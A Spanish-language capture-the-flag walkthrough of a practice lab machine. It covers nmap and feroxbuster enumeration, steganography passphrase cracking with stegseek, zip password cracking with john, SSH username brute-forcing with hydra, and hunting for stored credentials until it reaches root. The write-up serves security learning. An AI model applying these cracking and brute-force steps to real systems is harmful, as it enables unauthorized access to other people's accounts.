# Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2 -oN nmap
```
```css
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 09:17 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1b:16:59:41:d2:f1:d4:cf:20:cc:ad:e0:f8:8c:ed:a2 (ECDSA)
|_  256 72:9b:5b:79:74:e8:18:d6:0b:31:2e:99:00:01:b5:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.49 seconds
```
chequeando el servicio web, me consigo con la plnatilla de apache

![Screenshot From 2024-11-06 09-18-31](https://github.com/user-attachments/assets/4b4cb8c0-71a3-4999-bd98-af430b9ede68)

asi que realizo fuzzing web

# Fuzzinf Web

```ruby
 feroxbuster -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png,git -t 200 -d 10 --random-agent --no-state
```
```css
                                                                                                                                                                       
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.17.0.2
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png, git]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 10
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      310c http://172.17.0.2/scripts => http://172.17.0.2/scripts/
200      GET       22l      105w     5952c http://172.17.0.2/icons/ubuntu-logo.png
200      GET      939l     2384w    25537c http://172.17.0.2/spongebob/spongebob.html
200      GET      470l     2274w   217762c http://172.17.0.2/spongebob/upload/ohnorecallwin.jpg
200      GET      365l      968w    10733c http://172.17.0.2/index.html
200      GET      365l      968w    10733c http://172.17.0.2/
200      GET      838l     2290w    19747c http://172.17.0.2/spongebob/style.css
301      GET        9l       28w      312c http://172.17.0.2/spongebob => http://172.17.0.2/spongebob/
301      GET        9l       28w      309c http://172.17.0.2/revolt => http://172.17.0.2/revolt/
```

revisando, no consegui nada a priori, por lo que me descargo la imagen ubicada en `http://172.17.0.2/spongebob/upload/ohnorecallwin.jpg` para ver si le aplicaron
esteganografía y oculta informacion

```ruby
curl http://172.17.0.2/spongebob/upload/ohnorecallwin.jpg -o ohnorecallwin.jpg
```
ya descargada la imagen comienzo examinarla

```ruby
steghide --info ohnorecallwin.jpg
```
```css
"ohnorecallwin.jpg":
  format: jpeg
  capacity: 5.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```
por lo visto tiene informacion y esta protegida por una password, asi que le aplico un ataque de diccionario
```ruby
stegseek ohnorecallwin.jpg --wordlist /usr/share/wordlists/rockyou.txt
```
```css
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "spongebob"
[i] Original filename: "seguro.zip".
[i] Extracting to "ohnorecallwin.jpg.out".
```
ya la misma herramienta `stegseek` nos esta dando una pista, el nombre original era `seguro.zip` pero se extrajo un archivo llamado `ohnorecallwin.jpg.out`
por lo que valido el tipo de archivo que en realidaad es

```ruby
 file ohnorecallwin.jpg.out
```
```css
ohnorecallwin.jpg.out: Zip archive data, at least v1.0 to extract, compression method=store
```
y en efecto es un archivo `.zip` por lo que lo renombro a `seguro.zip` y lo descomprimo

```ruby
7z x seguro.zip
```
```css
7-Zip 24.08 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-08-11
 64-bit locale=C.UTF-8 Threads:8 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 211 bytes (1 KiB)

Extracting archive: seguro.zip
--
Path = seguro.zip
Type = zip
Physical Size = 211

    
Enter password (will not be echoed):
ERROR: Wrong password : secreto.txt
                  
Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1
```
pero me solicita password para poder descomprimir si que intentare crackearlo

```ruby
zip2john seguro.zip > ziphash
```
```ruby
john --wordlist=/usr/share/wordlists/rockyou.txt ziphash
```
```css
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
chocolate        (seguro.zip/secreto.txt)     
1g 0:00:00:00 DONE (2024-11-06 09:40) 50.00g/s 819200p/s 819200c/s 819200C/s 123456..cowgirlup
Use the "--show" option to display all of the cracked passwords reliably
```
por lo que ahora si podre descomprimir el archivo `seguro.zip`

```ruby
7z x seguro.zip
```
le paso la password y obtengo un archivo `secreto.txt` que al leerlo solo contiene la frase `aprendemos` que de momento solo me queda pensar es una password
debido a la tecnica que usaron para ocultarlo y el mismo nombre del archivo... asi que primero pruebo con un ataque de diccionario contra el servicio ssh

```ruby
hydra -L /user/share/wordlist/seclists/Usernames/xato-net-10-million-usernames.txt -p aprendemos ssh://172.17.0.2
```

![Screenshot From 2024-11-06 10-27-32](https://github.com/user-attachments/assets/f17f2d08-21a1-459d-ab06-cf1a869c967a)

con paciencia se consigue el user, ahora accedo al sistema

```ruby
ssh rosa@172.17.0.2
```

# Escalada de privilegios

### rosa

chequeando el directorio del user rosa, me consigo con el siguiente script

```css
#!/bin/bash

# Buscamos directorios que empiezan con "busca"
for directorio in busca*; do
	# Comprobamos si el directorio existe
	if [ -d "$directorio" ]; then
		# Crearmos 50 archivos y les metemos el contenido xx
		for i in {1..50}; do
			touch "$directorio/archivo$i" && echo "xxxxxx:xxxxxx" >$directorio/archivo$i
		done
		echo "Se crearon 50 archivos en $directorio"
	else
		echo "El directorio $directorio no existe"
	fi
done
```

queda bastante claro que funcion realiza el script, por lo que buscare archivos que no contengan la cadena `xxxxxx:xxxxxx`

```ruby
grep -rv "xxxxxx:xxxxxx"
```
```css
buscaelpass33/archivo21:pedro:ell0c0
creararch.sh:#!/bin/bash
creararch.sh:
creararch.sh:# Buscamos directorios que empiezan con "busca"
creararch.sh:for directorio in busca*; do
creararch.sh:	# Comprobamos si el directorio existe
creararch.sh:	if [ -d "$directorio" ]; then
creararch.sh:		# Crearmos 50 archivos y les metemos el contenido xx
creararch.sh:		for i in {1..50}; do
creararch.sh:		done
creararch.sh:		echo "Se crearon 50 archivos en $directorio"
creararch.sh:	else
creararch.sh:		echo "El directorio $directorio no existe"
creararch.sh:	fi
creararch.sh:done
```
aqui se puede ver el archivo `buscaelpass33` que contiene `pedro:ell0c0` lo que parecen ser credenciales asi que las pruebo

```ruby
su pedro
```

### pedro

buscando archivos del user `pedro` me consigo con lo siguiente:

```ruby
find / -type f -user pedro 2>/dev/null |grep -v "proc"
```
```css
/var/mail/.pass_juan
/home/pedro/.profile
/home/pedro/.../.misecreto
/home/pedro/.bash_logout
/home/pedro/.bashrc
/home/pedro/.cache/motd.legal-displayed
```
```ruby
cat /var/mail/.pass_juan

ZWxwcmVzaW9uZXMK
```
parece ser base64 asi que decodifico

```ruby
echo "ZWxwcmVzaW9uZXMK" |base64 -d
elpresiones
```
y escalo al usuario juan `su juan` pero no es, aunque se decodifico de base64 no es la password, asi que tras instentar con la misma cadena base64, resulto ser 
la password

### juan

busco archivos

```ruby
find / -type f -user juan 2>/dev/null |grep -v proc
```

```css
/home/juan/.profile
/home/juan/.bash_logout
/home/juan/.ordenes_nuevas
/home/juan/.bashrc
```
```ruby
cat /home/juan/.ordenes_nuevas
Hola soy tu patron y me canse y me fui a casa te dejo mi pass en un lugar a mano consiguelo y acaba el trabajo.
```
y despues de un rato buscando... en .bashrc consigo lo siguiente:

![Screenshot From 2024-11-06 11-08-42](https://github.com/user-attachments/assets/0baf5f52-13b1-4b97-91db-289cc60954c4)

he conseguido la password de root!

```ruby
uan@97f1519534ca:~$ su root
Password: 
root@97f1519534ca:/home/juan# id
uid=0(root) gid=0(root) groups=0(root)
root@97f1519534ca:/home/juan# 
```



























